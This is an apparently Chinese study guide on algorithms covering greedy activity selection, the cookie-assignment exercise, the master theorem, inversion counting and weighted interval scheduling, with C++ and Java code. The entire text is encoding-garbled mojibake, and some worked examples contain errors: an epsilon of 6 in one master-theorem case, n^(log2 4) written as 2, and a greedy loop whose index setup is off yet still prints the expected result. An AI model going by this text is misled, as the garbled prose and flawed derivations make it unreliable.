ä¾‹å¦‚æˆ‘ä»¬é€‰æ‹©äº†10å·æ´»åŠ¨ï¼ˆå¼€å§‹æ—¶é—´2ç‚¹ï¼Œç»“æŸæ—¶é—´13ç‚¹ï¼‰ï¼›2å·æ´»åŠ¨å¾…é€‰æ‹©ï¼ˆå¼€å§‹æ—¶é—´3ç‚¹ï¼Œç»“æŸæ—¶é—´5ç‚¹ï¼‰ï¼›\n    åˆ™ä¼šå‡ºç°ä¸Šå›¾æ‰€ç¤ºçš„æƒ…å†µï¼Œè¿™æ˜¾ç„¶è¿èƒŒäº†çº¦æŸæ¡ä»¶ã€‚\n\n**â‘¡**æ¯æ¬¡é€‰æ‹©**æŒç»­æ—¶é—´æœ€çŸ­**çš„æ´»åŠ¨ï¼ˆ`ä¸æ˜¯æœ€ä¼˜è§£`ï¼‰\n\n![](https://img.jwt1399.top/img/dMryDIJiFbVKQR0HXw3M.png)\n\n- è¯æ˜ï¼ˆåè¯æ³•ï¼‰ï¼š\n  - è´ªæŒç»­æ—¶é—´æœ€çŸ­ï¼Œæ˜¾ç„¶ä¹Ÿä¸å¯¹ï¼Œç‰¹æ®Šæƒ…å†µå‘ç”Ÿåœ¨æœ€çŸ­æ—¶é—´çš„æ´»åŠ¨ï¼Œä½ç½®åˆšå¥½å’Œå…¶ä»–æ´»åŠ¨å†²çªï¼Œå¦‚æœé€‰æ‹©æ—¶é—´æœ€çŸ­çš„æ´»åŠ¨ï¼Œä¹Ÿä¸æ˜¯æœ€ä¼˜è§£ã€‚\n  - ä¾‹å¦‚æˆ‘ä»¬é€‰æ‹©äº†2å·æ´»åŠ¨ï¼ˆå¼€å§‹æ—¶é—´3ç‚¹ï¼Œç»“æŸæ—¶é—´5ç‚¹ï¼‰ï¼›1å·æ´»åŠ¨å¾…é€‰æ‹©ï¼ˆå¼€å§‹æ—¶é—´1ç‚¹ï¼Œç»“æŸæ—¶é—´4ç‚¹ï¼‰ï¼›\n    åˆ™ä¼šå‡ºç°ä¸Šå›¾æ‰€ç¤ºçš„æƒ…å†µï¼Œè¿™æ˜¾ç„¶ä¹Ÿè¿èƒŒäº†çº¦æŸæ¡ä»¶ã€‚\n\n**â‘¢**æ¯æ¬¡é€‰æ‹©**ç»“æŸæ—¶é—´æœ€æ—©**çš„æ´»åŠ¨ï¼ˆ`æœ€ä¼˜è§£`ï¼‰\n\nè¦è¯æ˜ä¸€ä¸ªç®—æ³•æ˜¯é”™çš„éå¸¸ç®€å•ï¼Œè¦è¯æ˜æ˜¯å¯¹çš„å´éå¸¸éš¾ã€‚å¯¹äºè´ªå¿ƒç®—æ³•çš„è¯æ˜ï¼Œä¸€æ˜¯ä½¿ç”¨å½’çº³æ³•ï¼ŒäºŒæ˜¯é‡‡ç”¨åè¯æ³•ã€‚åƒä¸Šé¢ä¸¤ç§ç­–ç•¥ï¼Œæˆ‘ä»¬å®é™…ä¸Šå°±ç”¨åˆ°äº†åè¯æ³•ã€‚é‚£ä¹ˆæ€ä¹ˆè¯æ˜è´ªå¿ƒç®—æ³•æ˜¯å¯¹çš„å‘¢ï¼Ÿ\n\n<table>\n    <tbody>\n        <tr>\n            <td><input type=\"text\" placeholder=\"ğŸ””è¯·è¾“å…¥æ–‡ç« æŸ¥çœ‹ç ï¼Œçœ‹æ›´å¤šå†…å®¹\"></td>\n            <td><button class=\"btn\">Button</button></td>\n        </tr>\n</tbody></table>\n\n\n**3ã€è®¡ç®—æœ€ä¼˜è§£**\n\n`æ±‚è§£æ€è·¯ï¼š`å°†æ´»åŠ¨æŒ‰ç…§ç»“æŸæ—¶é—´è¿›è¡Œä»å°åˆ°å¤§æ’åºã€‚æŒ‘é€‰å‡ºç»“æŸæ—¶é—´å°½é‡æ—©çš„æ´»åŠ¨ï¼Œå¹¶ä¸”æ»¡è¶³åä¸€ä¸ªæ´»åŠ¨çš„èµ·å§‹æ—¶é—´æ™šäºå‰ä¸€ä¸ªæ´»åŠ¨çš„ç»“æŸæ—¶é—´ï¼Œå…¨éƒ¨æ‰¾å‡ºè¿™äº›æ´»åŠ¨å°±æ˜¯æœ€å¤§çš„ç›¸å®¹æ´»åŠ¨å­é›†åˆã€‚é¦–å…ˆæ£€æŸ¥æ´»åŠ¨ i æ˜¯å¦ä¸å½“å‰å·²é€‰æ‹©çš„æ‰€æœ‰æ´»åŠ¨ç›¸å®¹ã€‚è‹¥ç›¸å®¹ï¼Œæ´»åŠ¨ i åŠ å…¥å·²é€‰æ‹©æ´»åŠ¨çš„é›†åˆä¸­ï¼Œå¦åˆ™ä¸é€‰æ‹©æ´»åŠ¨ iï¼Œè€Œç»§ç»­æ£€æŸ¥ä¸‹ä¸€æ´»åŠ¨ä¸é›†åˆä¸­æ´»åŠ¨çš„ç›¸å®¹æ€§ã€‚è‹¥æ´»åŠ¨ i ä¸ä¹‹ç›¸å®¹ï¼Œåˆ™ i æˆä¸ºæœ€è¿‘åŠ å…¥é›†åˆ çš„æ´»åŠ¨ï¼Œå¹¶å–ä»£æ´»åŠ¨ j çš„ä½ç½®ã€‚\n\nå›¾ä¸­æ¯è¡Œç›¸åº”äºç®—æ³•çš„ä¸€æ¬¡è¿­ä»£ã€‚é˜´å½±é•¿æ¡è¡¨ç¤ºçš„æ´»åŠ¨æ˜¯å·²é€‰å…¥é›†åˆAçš„æ´»åŠ¨ï¼Œè€Œç©ºç™½é•¿æ¡è¡¨ç¤ºçš„æ´»åŠ¨æ˜¯å½“å‰æ­£åœ¨æ£€æŸ¥ç›¸å®¹æ€§çš„æ´»åŠ¨ã€‚\n\n![](https://img.jwt1399.top/img/image-20211126114040642.png)\n\n**å› æ­¤æœ€å¤§çš„ç›¸å®¹æ´»åŠ¨å­é›†åˆä¸º{1,4,8,11}**\n\n#### âä»£ç å®ç°\n\n```c\n#include <iostream>\nusing namespace std;\n\nvoid GreedyChoose(int len,int *s,int *f,bool *flag) {\n  flag[0] = true;\n  int j = 1;\n  for(int i=2;i<len;++i)\n    if (s[i] >= f[j]) {\n      flag[i] = true;\n      j = i;\n    }\n    else flag[i] = false;\n}\n\nint main(int argc, char* argv[]) {\n  int s[11] ={1,3,0,5,3,5,6,8,8,2,12};\n  int f[11] ={4,5,6,7,8,9,10,11,12,13,14};\n\n  bool mark[11] = {0};\n\n  GreedyChoose(11,s,f,mark);\n  for(int i=0;i<11;i++)\n    if (mark[i])\n      cout<<i+1<<\" \";\n  //system(\"pause\");\n  return 0;\n}\n```\n\n****\n\n~~å…¶ä»–ç»å…¸è´ªå¿ƒç®—æ³•å¦‚ä¸‹ï¼Œç­‰æœ‰ç©ºäº†å†è¯¦ç»†å†™å§ï¼~~\n\n~~æ‰¾é›¶é’±çš„é—®é¢˜ã€å•æºæœ€çŸ­è·¯å¾„ä¸­çš„Dijkstraç®—æ³•ã€æœ€å°ç”Ÿæˆæ ‘çš„Primç®—æ³•ã€æœ€å°ç”Ÿæˆæ ‘çš„Kruskalç®—æ³•ã€Huffmanç¼–ç ~~\n\n### â¹çœŸé¢˜ç»ƒä¹ \n\n#### LC5.åˆ†å‘é¥¼å¹²\n\n**é¢˜ç›®**\n\nå‡è®¾ä½ æ˜¯ä¸€ä½å¾ˆæ£’çš„å®¶é•¿ï¼Œæƒ³è¦ç»™ä½ çš„å­©å­ä»¬ä¸€äº›å°é¥¼å¹²ã€‚ä½†æ˜¯ï¼Œæ¯ä¸ªå­©å­æœ€å¤šåªèƒ½ç»™ä¸€å—é¥¼å¹²ã€‚\n\nå¯¹æ¯ä¸ªå­©å­ iï¼Œéƒ½æœ‰ä¸€ä¸ªèƒƒå£å€¼ g[i]ï¼Œè¿™æ˜¯èƒ½è®©å­©å­ä»¬æ»¡è¶³èƒƒå£çš„é¥¼å¹²çš„æœ€å°å°ºå¯¸ï¼›å¹¶ä¸”æ¯å—é¥¼å¹² jï¼Œéƒ½æœ‰ä¸€ä¸ªå°ºå¯¸ s[j] ã€‚å¦‚æœ s[j] >= g[i]ï¼Œæˆ‘ä»¬å¯ä»¥å°†è¿™ä¸ªé¥¼å¹² j åˆ†é…ç»™å­©å­ i ï¼Œè¿™ä¸ªå­©å­ä¼šå¾—åˆ°æ»¡è¶³ã€‚ä½ çš„ç›®æ ‡æ˜¯å°½å¯èƒ½æ»¡è¶³è¶Šå¤šæ•°é‡çš„å­©å­ï¼Œå¹¶è¾“å‡ºè¿™ä¸ªæœ€å¤§æ•°å€¼ã€‚\n\n\nç¤ºä¾‹ 1:\n\n```properties\nè¾“å…¥: g = [1,2,3], s = [1,1]\nè¾“å‡º: 1\nè§£é‡Š: \nä½ æœ‰ä¸‰ä¸ªå­©å­å’Œä¸¤å—å°é¥¼å¹²ï¼Œ3ä¸ªå­©å­çš„èƒƒå£å€¼åˆ†åˆ«æ˜¯ï¼š1,2,3ã€‚\nè™½ç„¶ä½ æœ‰ä¸¤å—å°é¥¼å¹²ï¼Œç”±äºä»–ä»¬çš„å°ºå¯¸éƒ½æ˜¯1ï¼Œä½ åªèƒ½è®©èƒƒå£å€¼æ˜¯1çš„å­©å­æ»¡è¶³ã€‚\næ‰€ä»¥ä½ åº”è¯¥è¾“å‡º1ã€‚\n```\n\nç¤ºä¾‹ 2:\n\n```properties\nè¾“å…¥: g = [1,2], s = [1,2,3]\nè¾“å‡º: 2\nè§£é‡Š: \nä½ æœ‰ä¸¤ä¸ªå­©å­å’Œä¸‰å—å°é¥¼å¹²ï¼Œ2ä¸ªå­©å­çš„èƒƒå£å€¼åˆ†åˆ«æ˜¯1,2ã€‚\nä½ æ‹¥æœ‰çš„é¥¼å¹²æ•°é‡å’Œå°ºå¯¸éƒ½è¶³ä»¥è®©æ‰€æœ‰å­©å­æ»¡è¶³ã€‚\næ‰€ä»¥ä½ åº”è¯¥è¾“å‡º2.\t\n```\n\n\næç¤ºï¼š\n\n- 1 <= g.length <= 3 * 104\n- 0 <= s.length <= 3 * 104\n- 1 <= g[i], s[j] <= 231 - 1\n\n**æ€è·¯**\n\nä¸ºäº†äº†æ»¡è¶³æ›´å¤šçš„å°å­©ï¼Œå°±ä¸è¦é€ æˆé¥¼å¹²å°ºå¯¸çš„æµªè´¹ã€‚\n\n**è¿™é‡Œçš„å±€éƒ¨æœ€ä¼˜å°±æ˜¯å°é¥¼å¹²å–‚ç»™èƒƒå£å°çš„æˆ–è€…å¤§é¥¼å¹²å–‚ç»™èƒƒå£å¤§çš„ï¼Œå……åˆ†åˆ©ç”¨é¥¼å¹²å°ºå¯¸å–‚é¥±å°å­©ï¼Œå…¨å±€æœ€ä¼˜å°±æ˜¯å–‚é¥±å°½å¯èƒ½å¤šçš„å°å­©**ã€‚\n\nå¯ä»¥å°è¯•ä½¿ç”¨è´ªå¿ƒç­–ç•¥ï¼Œå…ˆå°†é¥¼å¹²æ•°ç»„å’Œå°å­©æ•°ç»„æ’åºã€‚\n\nç„¶åä»å‰å‘åæˆ–è€…ä»åå‘å‰éå†å°å­©æ•°ç»„ï¼Œç”¨å°é¥¼å¹²æ»¡è¶³èƒƒå£å°çš„æˆ–è€…å¤§é¥¼å¹²ä¼˜å…ˆæ»¡è¶³èƒƒå£å¤§çš„ï¼Œå¹¶ç»Ÿè®¡æ»¡è¶³å°å­©æ•°é‡ã€‚\n\n**è§£ç­”**\n\n```java\n// ä¼˜å…ˆè€ƒè™‘é¥¼å¹²ï¼Œå°é¥¼å¹²å…ˆå–‚é¥±å°èƒƒå£\nclass Solution {\n    public int findContentChildren(int[] g, int[] s) {\n        Arrays.sort(g);\n        Arrays.sort(s);\n        int count = 0;\n        for(int i = 0, j = 0; i < g.length && j < s.length; j++){\n            if(g[i] <= s[j]){\n                count++;\n                i++;\n            }\n        }\n        return count;\n    }\n}\n```\n\n```java\n// ä¼˜å…ˆè€ƒè™‘èƒƒå£ï¼Œå…ˆå–‚é¥±å¤§èƒƒå£\nclass Solution {\n    public int findContentChildren(int[] g, int[] s) {\n        Arrays.sort(g);\n        Arrays.sort(s);\n        int count = 0;\n        int j = s.length - 1;\n        // éå†èƒƒå£\n        for (int i = g.length - 1; i >= 0; i--) {\n            if(j >= 0 && g[i] <= s[j]) {\n                count++;\n                j--;\n            }\n        }\n        return count;\n    }\n}\n```\n\n## â‘£åˆ†æ²»ç®—æ³•\n\n> **æœ¬ç« é‡ç‚¹ï¼š**\n>\n> - ç†è§£åˆ†æ²»ç®—æ³•çš„æ€æƒ³ï¼›\n> - æŒæ¡Counting inversionsé—®é¢˜çš„åˆ†æ²»ç®—æ³•ï¼›\n> - èƒ½ç”¨Master Theoremæ±‚è§£é€’å½’å…³ç³»å¼\n\n### â¶ç®—æ³•åˆ†æ\n\nåˆ†æ²»ç®—æ³•çš„æ ¸å¿ƒæ˜¯**åˆ†è€Œæ²»ä¹‹**ï¼Œå°±æ˜¯æŠŠä¸€ä¸ªå¤æ‚çš„é—®é¢˜**åˆ†æˆ**å¤šä¸ªç›¸åŒ/ç›¸ä¼¼çš„å­é—®é¢˜ï¼Œé€’å½’åœ°è§£å†³è¿™äº›å­é—®é¢˜ç„¶åè¿›è¡Œ**åˆå¹¶**ï¼ŒåŸé—®é¢˜çš„è§£å³å­é—®é¢˜è§£çš„åˆå¹¶ã€‚\n\n**åˆ†æ²»æ³•é€‚ç”¨çš„æƒ…å†µ**\n\n- é—®é¢˜çš„è§„æ¨¡ç¼©å°åˆ°ä¸€å®šçš„ç¨‹åº¦å°±å¯ä»¥å®¹æ˜“åœ°è§£å†³ï¼›\n- é—®é¢˜å¯ä»¥åˆ†è§£ä¸ºè‹¥å¹²ä¸ªè§„æ¨¡è¾ƒå°çš„ç›¸åŒé—®é¢˜ï¼Œå³è¯¥é—®é¢˜å…·æœ‰æœ€ä¼˜å­ç»“æ„æ€§è´¨ï¼›\n- é—®é¢˜åˆ†è§£å‡ºçš„å­é—®é¢˜çš„è§£å¯ä»¥åˆå¹¶ä¸ºé—®é¢˜çš„è§£ï¼›\n- é—®é¢˜æ‰€åˆ†è§£å‡ºçš„å„ä¸ªå­é—®é¢˜æ˜¯ç›¸äº’ç‹¬ç«‹çš„ï¼Œå³å­é—®é¢˜ä¹‹é—´ä¸åŒ…å«å…¬å…±çš„å­å­é—®é¢˜ã€‚\n\n**è§£é¢˜æ­¥éª¤**\n\n- 1.åˆ†è§£ï¼šå°†åŸé—®é¢˜åˆ†è§£ä¸ºè‹¥å¹²è§„æ¨¡è¾ƒå°ï¼Œç›¸äº’ç‹¬ç«‹ï¼Œä¸åŸé—®é¢˜ç›¸åŒçš„å­é—®é¢˜ã€‚\n- 2.è§£å†³ï¼šè‹¥å¹²å­é—®é¢˜è¾ƒå°è€Œå®¹æ˜“è¢«è§£å†³åˆ™ç›´æ¥è§£å†³ï¼Œå¦åˆ™å†ç»§ç»­åˆ†è§£ä¸ºæ›´å°çš„å­é—®é¢˜ï¼Œç›´åˆ°å®¹æ˜“è§£å†³ã€‚\n- 3.åˆå¹¶ï¼šå°†å·²æ±‚è§£çš„å„ä¸ªå­é—®é¢˜çš„è§£ï¼Œé€æ­¥åˆå¹¶ä¸ºåŸé—®é¢˜çš„è§£ã€‚\n\n### â·ä¸»å®šç†\n\nä¸»å®šç†é€‚ç”¨äºæ±‚è§£å³è¾¹é€’å½’å¼ç®—æ³•çš„æ—¶é—´å¤æ‚åº¦ï¼š**T(n) = aT(n/b) + f(n)**\n\nå…¶ä¸­ï¼š\n\n- nï¼šé—®é¢˜çš„è§„æ¨¡å¤§å°\n- aï¼šåŸé—®é¢˜çš„å­é—®é¢˜ä¸ªæ•°\n- n/bï¼šæ¯ä¸ªå­é—®é¢˜çš„å¤§å°\n- f(n)ï¼šå°†åŸé—®é¢˜åˆ†è§£æˆå­é—®é¢˜å’Œå°†å­é—®é¢˜çš„è§£åˆå¹¶æˆåŸé—®é¢˜çš„è§£çš„æ—¶é—´ã€‚\n\n**å®šç†ï¼š**è®¾ a >= 1ï¼Œb >=1 ä¸ºå¸¸æ•°ï¼Œè®¾ f(n) ä¸ºä¸€å‡½æ•°ï¼ŒT(n) ç”±ä»¥ä¸‹é€’å½’å¼ç»™å‡º T(n) = aT(n/b) + f(n)ï¼Œåˆ™T(n)å¯èƒ½æœ‰å¦‚ä¸‹æ¸è¿‘ç•Œï¼š\n\n- â‘ è‹¥ f(n) < n<sup>log<sub>b</sub>a</sup> æ—¶ï¼Œå­˜åœ¨ Îµ > 0ï¼Œæœ‰ f(n) = O(n<sup>log<sub>b</sub>a-Îµ</sup>)ï¼Œåˆ™ **T(n) = Î˜(n<sup>log<sub>b</sub>a</sup>)**\n\n- â‘¡è‹¥ f(n) = n<sup>log<sub>b</sub>a</sup> æ—¶ï¼Œæœ‰ f(n) = Î˜(n<sup>log<sub>b</sub>a</sup>)ï¼Œåˆ™ **T(n) = Î˜(n<sup>log<sub>b</sub>a</sup>logn)**\n- â‘¢è‹¥ f(n) > n<sup>log<sub>b</sub>a</sup> æ—¶ï¼Œå­˜åœ¨ Îµ > 0ï¼Œæœ‰ f(n) = Î©(n<sup>log<sub>b</sub>a+Îµ</sup>)ï¼Œä¸”æ»¡è¶³ af(n/b) â‰¤ cf(n), c<1ï¼Œåˆ™ **T(n) = Î˜(f(n))**\n\n**æ¥å‡ é“ä¾‹é¢˜ï¼Œåˆ©ç”¨ä¸»å®šç†æ±‚æ¸è¿‘è¡¨è¾¾å¼ï¼š**\n\nä¾‹ä¸€ï¼šæ±‚è§£é€’æ¨æ–¹ç¨‹ T(n) = 9T(n/3) + n\n\nâ€‹\ta = 9ï¼Œb = 3 ï¼Œf(n) = nï¼Œn<sup>log<sub>b</sub>a</sup> = n<sup>log<sub>3</sub>9</sup> = n<sup>2</sup> > f(n)\n\n   å­˜åœ¨ f(n) = O(n<sup>log<sub>b</sub>a-Îµ</sup>) = O(n<sup>log<sub>3</sub>9-6</sup>)ï¼ŒÎµ = 6\n\nâ€‹\tæ»¡è¶³ä¸»å®šç†çš„æ¡ä»¶1ï¼Œå› æ­¤ T(n) = Î˜(n<sup>log<sub>b</sub>a</sup>) = Î˜(n<sup>2</sup>)\n\n ä¾‹äºŒï¼šæ±‚è§£é€’æ¨æ–¹ç¨‹ T(n) = T(2n/3) + 1\n\nâ€‹\ta = 1ï¼Œb = 3/2ï¼Œf(n)=1ï¼Œn<sup>log<sub>b</sub>a</sup> = n<sup>log<sub>3/2</sub>1</sup> =  n<sup>0</sup> = 1 = f(n)\n\nâ€‹\tæ»¡è¶³ä¸»å®šç†çš„æ¡ä»¶2ï¼Œæ‰€ä»¥T(n) = Î˜(n<sup>log<sub>b</sub>a</sup>logn) = Î˜(logn)\n\n ä¾‹ä¸‰ï¼šæ±‚è§£é€’æ¨æ–¹ç¨‹ T(n) = 3T(n/4) + nlogn\n\nâ€‹\ta = 3ï¼Œb = 4ï¼Œf(n) = nlognï¼Œn<sup>log<sub>b</sub>a</sup> = n<sup>log<sub>4</sub>3Â </sup>< f(n)\n\nâ€‹\tå†åˆ¤æ–­æ˜¯å¦æ»¡è¶³ä¸ç­‰å¼ï¼šaf(n/b) â‰¤ cf(n)ï¼Œä»£å…¥f(n) = nlogn\n\nâ€‹\t(3n/4)log(n/4)å’Œcnlognï¼Œå½“ c â‰¥ 3/4 å³å¯æ»¡è¶³ af(n/b) â‰¤ cf(n) çš„å…³ç³»\n\nâ€‹\tå³æ»¡è¶³ä¸»å®šç†çš„æ¡ä»¶3ï¼Œæ‰€ä»¥T(n) = Î˜(f(n)) = Î˜(nlogn)\n\n### â¸è®¡æ•°é€†åº\n\n> **é—®é¢˜æè¿°ï¼š**è®¾ S ä¸ºä¸€ä¸ªæœ‰ n ä¸ªæ•°å­—çš„æœ‰åºé›† ( n > 1 )ï¼Œå…¶ä¸­æ‰€æœ‰æ•°å­—å„ä¸ç›¸åŒã€‚å¦‚æœå­˜åœ¨æ­£æ•´æ•° i , j ä½¿å¾— 1 â‰¤ i < j â‰¤ n å¹¶ä¸” S [ i ] > S [ j ] ï¼Œåˆ™ ï¼ˆS [ i ] , S [ j ] ï¼‰ è¿™ä¸ªæœ‰åºå¯¹ç§°ä¸º S çš„ä¸€ä¸ªé€†åºå¯¹ï¼Œä¹Ÿç§°ä½œé€†åºæ•°ã€‚\n\nåˆ†è§£ï¼šå°† S åˆ†ä¸º A å’Œ B ä¸¤éƒ¨åˆ†ã€‚\n\nè§£å†³ï¼šé€’å½’è®¡ç®—A ã€Bã€ABä¸­çš„é€†åºæ•°ã€‚\n\nåˆå¹¶ï¼šè¿”å›ä¸‰ä¸ªè®¡æ•°çš„æ€»å’Œã€‚\n\n![](https://img.jwt1399.top/img/202111242033582.png)\n\n### â¹çœŸé¢˜ç»ƒä¹ \n\n#### â€é¢˜ç›®1\n\n![](https://img.jwt1399.top//img/20211017212545.png)\n\n(1) f(n) = 9f(n/6) + Î˜(nlogn)\n\na = 9 ï¼Œ b = 6 ï¼Œ f(n) = Î˜(nlogn)ï¼Œ n<sup>log<sub>b</sub>a</sup> = n<sup>log<sub>6</sub>9</sup> ï¼ŒÎ˜(nlogn) < Î˜(n<sup>log<sub>6</sub>9</sup>)ï¼Œ\n\nf(n) < Î˜( n<sup>log<sub>b</sub>a</sup>)ï¼Œå› æ­¤ f(n) =  Î˜(n<sup>log<sub>b</sub>a</sup>) = Î˜(n<sup>log<sub>6</sub>9</sup> )\n\n\n\n(2) f(n) = 2f(n-3) + Î˜(n)\n\n------\n\nf(n) - 2f(n -3) = n                                         â‘ \n\n2f(n -3) - 2<sup>2</sup>f(n-6) = 2(n-3)                           â‘¡\n\n2<sup>2</sup>f(n-6)- 2<sup>3</sup>f(n-9) = 2<sup>2</sup>(n-3)                          â‘¢\n\n......\n\n2<sup>k-1</sup>f(n-3(k-1)) - 2<sup>k</sup>f(n-3k) = 2<sup>k-1</sup>(n-3(k-1))   ç¬¬ké¡¹\n\n------\n\nâ‘  + â‘¡ + â‘¢ + ... + ç¬¬ké¡¹ å¾—ï¼š\n\nf(n) - 2<sup>k</sup>f(n-3k) = n(2<sup>0</sup>+2<sup>1</sup>+2<sup>2</sup>+...+2<sup>k-1</sup>) - 3(2+2\\*2<sup>2</sup>+3\\*2<sup>3</sup>+...+(k-1)\\*2<sup>k-1</sup>)\n\nâ€‹\t\t\t\t\t\t\t = -n*(1-2<sup>k</sup>) - 3\\*(2<sup>k</sup>(k-2)+2)\n\nâ€‹\t\t\t\t\t\t\t= (2<sup>k</sup>-1)\\*n -3*2<sup>k</sup>(k-2) - 6\n\n**â‡’** f(n) =  (2<sup>k</sup>-1)\\*n  -3*2<sup>k</sup>(k-2) - 6 + 2<sup>k</sup>f(n-3k) \n\nä»¤ k = n/3 åˆ™ï¼š**â‡’** f(n) = n\\*2<sup>n/3</sup> - n - n\\*2<sup>n/3</sup>  + 6\\*2<sup>n/3</sup> - 6 + 2<sup>n/3</sup>\n\n**â‡’** f(n) = 7\\*2<sup>n/3</sup> - n - 6 \n\nå› æ­¤ f(n) =Î˜(2<sup>n/3</sup>)\n\n\n\n\n\n(3) f(n) = 4f(n/2) + Î˜(n<sup>2</sup>)\n\na = 4 ï¼Œb = 2 ï¼Œf(n) = Î˜(n<sup>2</sup>)ï¼Œn<sup>log<sub>b</sub>a</sup> = n<sup>log<sub>2</sub>4</sup>  = 2 \n\nf(n) = Î˜( n<sup>log<sub>b</sub>a</sup> )ï¼Œå› æ­¤ f(n) = Î˜(n<sup>log<sub>b</sub>a</sup>logn) = Î˜(n<sup>2</sup>logn)\n\n#### âé¢˜ç›®2\n\nä¸€ä¸ªæ•°çš„åºåˆ—ä¸­æ’åœ¨å‰é¢çš„æ•°æ¯”æ’åœ¨åé¢çš„æ•°è¦å¤§çš„è¯åˆ™ç§°ä¸ºä¸€å¯¹é€†åºã€‚é—®ä¸‹é¢è¿™ä¸ªåºåˆ—ä¸­å­˜åœ¨å¤šå°‘å¯¹é€†åºï¼š5ï¼Œ10ï¼Œ7ï¼Œ9ï¼Œ13ï¼Œ1ï¼Œ8ï¼Œ4ï¼Œ12ï¼Œ2ï¼Œ6ï¼Œ3ï¼Œ11ï¼Œ14ã€‚ï¼ˆ4åˆ†ï¼‰\n\nç­”ï¼š4+8+5+6+8+0+4+2+4+0+1+0+0=42\n\n## â‘¤åŠ¨æ€è§„åˆ’\n\n> **æœ¬ç« é‡ç‚¹ï¼š**\n>\n> - ç†è§£åŠ¨æ€è§„åˆ’ç®—æ³•çš„æ€æƒ³ã€‚\n> - å¯¹ç›¸åº”é—®é¢˜èƒ½å»ºç«‹åŸºæœ¬çš„é€’å½’å…³ç³»å¼å¹¶ç”¨ä»åº•è‡³ä¸Šçš„æ–¹æ³•æ¥æ±‚è§£ï¼Œåœ¨æ±‚è§£è¿‡ç¨‹ä¸­çŸ¥é“å¦‚ä½•å»ºç«‹æ•°æ®å‚¨å­˜çš„è¡¨æ ¼ã€‚\n> - é‡ç‚¹æŒæ¡çš„é—®é¢˜ï¼šå¸¦æƒé‡çš„æ´»åŠ¨å®‰æ’é—®é¢˜ã€0-1èƒŒåŒ…é—®é¢˜ã€æœ€é•¿å…¬å…±å­åºåˆ—é—®é¢˜ã€çŸ©é˜µè¿ä¹˜çš„æœ€ä¼˜è®¡ç®—æ¬¡åºé—®é¢˜ã€‚\n> - ç†è§£0-1èƒŒåŒ…é—®é¢˜çš„åŠ¨æ€è§„åˆ’ç®—æ³•ä¸æ˜¯å¤šé¡¹å¼æ—¶é—´ç®—æ³•ã€‚\n\n### â¶ç®—æ³•åˆ†æ\n\nåŠ¨æ€è§„åˆ’é—®é¢˜åˆ†ææ˜¯è‡ªé¡¶è€Œä¸‹çš„æ€è·¯ï¼Œä½†æ˜¯ç®—æ³•å®ç°å´æ˜¯è‡ªåº•è€Œä¸Šçš„ç­–ç•¥ã€‚\n\nåŠ¨æ€è§„åˆ’ä¸åˆ†æ²»æ³•ç±»ä¼¼ï¼Œéƒ½æ˜¯æŠŠå¤§é—®é¢˜æ‹†åˆ†æˆå°é—®é¢˜ï¼Œé€šè¿‡å¯»æ‰¾å¤§é—®é¢˜ä¸å°é—®é¢˜çš„é€’æ¨å…³ç³»ï¼Œè§£å†³ä¸€ä¸ªä¸ªå°é—®é¢˜ï¼Œæœ€ç»ˆè¾¾åˆ°è§£å†³åŸé—®é¢˜çš„æ•ˆæœã€‚\n\nä½†ä¸åŒçš„æ˜¯ï¼Œåˆ†æ²»æ³•åœ¨å­é—®é¢˜å’Œå­å­é—®é¢˜ç­‰ä¸Šè¢«é‡å¤è®¡ç®—äº†å¾ˆå¤šæ¬¡ï¼Œè€ŒåŠ¨æ€è§„åˆ’åˆ™å…·æœ‰è®°å¿†æ€§ï¼Œé€šè¿‡å¡«å†™è¡¨æŠŠæ‰€æœ‰å·²ç»è§£å†³çš„å­é—®é¢˜ç­”æ¡ˆçºªå½•ä¸‹æ¥ï¼Œåœ¨æ–°é—®é¢˜é‡Œéœ€è¦ç”¨åˆ°çš„å­é—®é¢˜å¯ä»¥ç›´æ¥æå–ï¼Œé¿å…äº†é‡å¤è®¡ç®—ï¼Œä»è€ŒèŠ‚çº¦äº†æ—¶é—´ï¼Œæ‰€ä»¥åœ¨é—®é¢˜æ»¡è¶³æœ€ä¼˜æ€§åŸç†ä¹‹åï¼Œç”¨åŠ¨æ€è§„åˆ’è§£å†³é—®é¢˜çš„æ ¸å¿ƒå°±åœ¨äºå¡«è¡¨ï¼Œè¡¨å¡«å†™å®Œæ¯•ï¼Œæœ€ä¼˜è§£ä¹Ÿå°±æ‰¾åˆ°ã€‚\n\n### â·å¸¦æƒåŒºé—´è°ƒåº¦\n\n>**é—®é¢˜æè¿°ï¼š**ç»™å®šè‹¥å¹²ä¸ªå·¥ä½œ job çš„å¼€å§‹æ—¶é—´ **s<sub>j</sub>**ã€ç»“æŸæ—¶é—´ **f<sub>j</sub>** å’Œæƒé‡ **v<sub>j</sub>**ï¼ˆå¯ä»¥ç†è§£æˆé‡è¦ç¨‹åº¦ï¼‰ï¼Œæ±‚å‡ºèƒ½å®Œæˆçš„æœ€å¤§çš„å·¥ä½œæƒé‡ï¼ˆå°½å¯èƒ½åœ°å®Œæˆæ›´é‡è¦çš„å·¥ä½œï¼‰ï¼Œä¸”å¿…é¡»æ»¡è¶³å„ä¸ª**å·¥ä½œç›¸å®¹**(**å·¥ä½œå®‰æ’çš„æ—¶é—´æ²¡æœ‰é‡å **)ã€‚\n>\n>ä¾‹å¦‚æœ‰å¦‚ä¸‹ä¸‰ä¸ªå·¥ä½œï¼š\n>\n>| job   | s    | f    | v    |\n>| ----- | ---- | ---- | ---- |\n>| å·¥ä½œ1 | 0    | 3    | 4    |\n>| å·¥ä½œ2 | 5    | 6    | 5    |\n>| å·¥ä½œ3 | 2    | 8    | 10   |\n>\n>ç”±ä¸å¸¦æƒé‡çš„åŒºé—´è°ƒåº¦æ–¹æ³•(è´ªå¿ƒ)ï¼ŒæŒ‰**æœ€æ—©ç»“æŸæ—¶é—´**ä¸”ç›¸å®¹é€‰æ‹©å·¥ä½œï¼Œè¿™é‡Œå°±é€‰å‡º{å·¥ä½œ1, å·¥ä½œ2}ï¼Œèƒ½å®ç°çš„æœ€å¤§æƒé‡æ˜¯4+5=9ã€‚ä½†æ˜¯ï¼Œé€‰æ‹©{å·¥ä½œ3}æƒé‡å¯è¾¾åˆ°10ï¼Œå› æ­¤**æœ€æ—©ç»“æŸæ—¶é—´çš„è´ªå¿ƒç­–ç•¥åœ¨å¸¦æƒåŒºé—´è°ƒåº¦é—®é¢˜é‡Œå·²ä¸é€‚ç”¨**ã€‚é‚£ä¹ˆå¦‚ä½•æ±‚ç›¸äº’å…¼å®¹å·¥ä½œçš„æœ€å¤§æƒå€¼å­é›†å‘¢ï¼Ÿ\n\n#### 